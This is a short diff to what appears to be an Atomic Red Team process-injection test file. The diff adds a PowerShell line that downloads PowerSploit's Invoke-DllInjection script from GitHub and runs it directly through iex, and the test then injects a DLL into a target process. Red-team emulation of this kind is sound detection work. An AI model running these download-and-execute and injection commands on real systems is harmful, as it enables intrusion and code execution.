@@ -43,6 +43,7 @@ atomic_tests:
   executor:
     name: powershell
     command: |
+      . { iwr -uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1 } | iex
       Invoke-DllInjection.ps1 -ProcessID #{process_id} -Dll #{dll_payload}
 
 - name: Shared Library Injection via /etc/ld.so.preload
@@ -81,4 +82,4 @@ atomic_tests:
   executor:
     name: command_prompt
     command: |
-      .\bin\#{exe_binary}
+      C:\AtomicRedTeam\atomics\T1055\bin\#{exe_binary}
